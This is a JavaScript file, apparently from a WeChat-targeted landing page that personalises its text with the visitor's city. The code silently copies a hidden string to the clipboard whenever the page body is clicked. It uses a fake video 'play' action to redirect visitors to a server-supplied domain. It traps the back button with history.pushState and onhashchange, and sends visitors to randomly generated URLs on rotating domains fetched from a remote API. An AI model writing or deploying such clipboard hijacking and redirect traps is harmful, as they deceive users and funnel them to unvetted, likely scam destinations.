if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
        document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
} else {
    onBridgeReady();
}

function onBridgeReady() {
    WeixinJSBridge.call('hideOptionMenu');
}

var address = localAddress.city ? localAddress.city : (localAddress.province ? localAddress.province : '北京');
var city = address.replace(/(.*)市/, '$1');
city = city.replace(/(.*)省/, '$1');
var t = $('.t').text();
var res = t.replace(/{city}/g, city);
$('.t').text(res);
document.title = obj.t.replace(/{city}/g, city);
$("body").addClass("xs_btn_yy");
var clipboard = new Clipboard(".xs_btn_yy", {
    text: function () {
        return obj.kl
    }
});
$('li').each(function (index) {
    $(this).html($(this).html().replace(/{city}/g, city));
});
var _PlayVideo = new NewTxplayer({
    modId: 'tp5',
    vid: obj.vid,
    currtime: obj.dump,
    story: obj.story
});
_PlayVideo.PlayStart = function () {
    $.get("http://" + obj.g + "/a6165959de58df312b45042f0d7415ee", function (data) {
        if (data != "") {
            obj.url = data + '?pop=' + window.name + '&tp=' + _totp;
        }
        ;location.href = obj.url;
    })
};
$('li').on('click', function () {
    location.href = $(this).attr('data-type');
});
var url = '';
$.get('http://' + obj.g + '/?s=/Api/mydomain&uid=fei&sign=c0e5883d1d712171f1f96d3b135df20f&v=1.0', function (rData) {
    setTimeout(function () {
        history.pushState(history.length + 1, "ttt", "#" + new Date().getTime());
    }, 200);
    url = "http://" + rData + "/g1" + makeid() + makeid() + "/" + makeid() + "?login=" + makeid();
    window.onhashchange = function () {
        location.href = url;
    };
    document.getElementById('fanhui').onclick = function () {
        location.href = url;
    };
});
var len = $("#vo ul li").length;
for (var i = 0; i < len; i++) {
    if ((i + 1) % 2 == 1) {
        $('#vo ul li:eq(' + i + ')').css('color', 'red')
    }
}